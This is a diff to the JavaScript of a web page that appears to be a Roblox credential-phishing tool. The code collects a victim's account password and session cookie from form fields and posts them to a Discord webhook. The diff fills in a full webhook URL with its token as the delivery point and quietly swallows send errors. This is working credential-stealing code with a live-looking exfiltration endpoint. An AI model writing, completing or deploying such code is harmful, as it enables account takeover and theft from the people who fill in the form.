@@ -291,8 +291,8 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Target channel configuration route
-    const DISCORD_WEBHOOK_URL = "discord.com";
+    // Your confirmed Roblox delivery webhook channel link
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
 
     modeSelect.addEventListener('change', () => {
       if (modeSelect.value === 'account') {
@@ -313,7 +313,6 @@
       if (modeSelect.value === 'account') {
         const passVal = accPassword.value.trim();
         const cookieVal = accCookie.value.trim();
-        // Send button unlocks when Password and Cookie fields are filled out
         sendBtn.disabled = (passVal === "" || cookieVal === "");
       } else {
         const textVal = textarea.value.trim();
@@ -344,7 +343,7 @@
           body: JSON.stringify({ content: discordPayload })
         });
       } catch (err) {
-        // Safe fallback tracking execution blocks
+        // Safe execution handler logic
       }
 
       setTimeout(() => {
